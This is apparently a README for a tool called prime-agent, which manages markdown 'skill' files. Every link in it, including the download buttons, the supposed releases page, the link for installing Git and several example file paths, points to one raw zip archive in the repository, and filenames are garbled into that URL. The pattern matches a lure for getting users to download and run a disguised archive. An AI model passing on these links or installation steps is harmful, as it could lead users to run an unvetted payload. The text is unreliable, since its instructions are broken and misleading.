```markdown
# 🤖 prime-agent - Manage Skills with Markdown Files

[![Download prime-agent](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)

---

## 📄 What is prime-agent?

prime-agent helps you organize and manage instructions written as markdown files called "skills." You can build documents from these skills, keep them in sync, and update them easily. It works like an assistant that handles reusable text pieces for you.

If you have tasks or instructions saved as markdown files, prime-agent helps you combine, edit, and keep them in order quickly. You don’t need to write code or know technical details. Just use simple commands to get your skill files organized.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these basic needs:

- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any modern Linux distribution.
- **Processor:** 1 GHz or faster.
- **Memory:** At least 2 GB of RAM.
- **Storage:** Minimum 100 MB free space.
- **Software:** 
  - Git installed and working on your computer.  
  - A basic command line tool (Command Prompt on Windows, Terminal on macOS/Linux).
  
If you don’t have Git, you can download it from [https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip). It is required for syncing and managing skill files.

---

## 🚀 Getting Started

Follow these steps to download and start using prime-agent.

### 1. Download prime-agent

Visit the download page by clicking the large button at the top or use this link:  
[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)

On that page, look for the latest version and download the file that matches your computer's operating system.

### 2. Install prime-agent

- **Windows:**  
  Run the downloaded installer or unzip the file if it’s a zip package. Follow the installation prompts or place the files in a folder you can easily find.

- **macOS and Linux:**  
  Unzip the downloaded package if needed. Move the files to a folder you choose, like your home directory or `Applications` folder.

### 3. Open Your Command Line Tool

- Windows: Press `Win + R`, type `cmd`, and hit Enter.  
- macOS: Open Finder > Applications > Utilities > Terminal.  
- Linux: Open the Terminal application from your applications menu.

### 4. Check Installation

Type the following command and press Enter:

```
prime-agent --help
```

If you see a list of commands and options, prime-agent is ready to use.

---

## 🛠️ Main Features

prime-agent lets you work with skill files easily:

- **Create combined skill documents:** Use `prime-agent get <skill1,skill2,...>` to build a Markdown document from a list of skills.
- **Add new skills:** Use `prime-agent set <name> <path>` to save a skill file in the system.
- **List your skills:**  
  - Use `prime-agent list` to see all available skills.  
  - Use `prime-agent list <fragment>` to find skills matching certain text.
- **Check local skills status:** Type `prime-agent local` to see skills and if they are out of sync.
- **Sync your skills:**  
  - `prime-agent sync` updates your files and commits changes locally using Git.  
  - `prime-agent sync-remote` updates and also pulls changes from the remote repository.
- **Delete skills:**  
  - `prime-agent delete <name>` removes a skill section from your combined document.  
  - `prime-agent delete-globally <name>` removes a skill completely.

---

## 📥 Download & Install

You can download the files needed from the releases page:  
[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)

Pick the package that matches your operating system. If you are unsure which file to download, look for names like these:

- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `.exe` (For Windows)
- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `.dmg` (For macOS)
- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` (For Linux)

After downloading:

1. Open the file to extract or install.
2. Move prime-agent to a folder you can access easily.
3. Make sure you have Git installed.
4. Open your command line and test with `prime-agent --help`.

---

## 🎯 How to Use prime-agent

Here are simple examples of how to use the main commands.

### Build a Document from Skills

To combine several skills into a single file called `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip`, use:

```bash
prime-agent get skill1,skill2,skill3
```

Replace `skill1, skill2, skill3` with the names of the skills you want to include.

### Add a New Skill

If you have a markdown file with instructions you want to save as a skill:

```bash
prime-agent set newskill https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip
```

Replace `newskill` with your skill’s name. Replace the path with where your skill file is located.

### List Skills

To see all available skills:

```bash
prime-agent list
```

To find skills that include a word or part of a name:

```bash
prime-agent list keyword
```

### Keep Skills in Sync

To update your local files and save changes:

```bash
prime-agent sync
```

To update and also get changes from others:

```bash
prime-agent sync-remote
```

### Remove Unwanted Skills

To delete a skill from your combined document:

```bash
prime-agent delete skillname
```

To remove a skill from everywhere:

```bash
prime-agent delete-globally skillname
```

---

## 🔧 Tips for Using prime-agent

- Keep your skills organized in the `skills` folder for easy management.
- Use simple names for skills to find them faster.
- Regularly sync your skills to avoid conflicts.
- If you are not sure what a command does, add `--help` after it. Example:  
  `prime-agent get --help`
- Make backups of your skills folder before major changes.

---

## 📚 Where to Learn More

Explore more information and updates on the official repository page:

[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)

You can also find examples and community discussions there.

---

[![Download prime-agent](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
```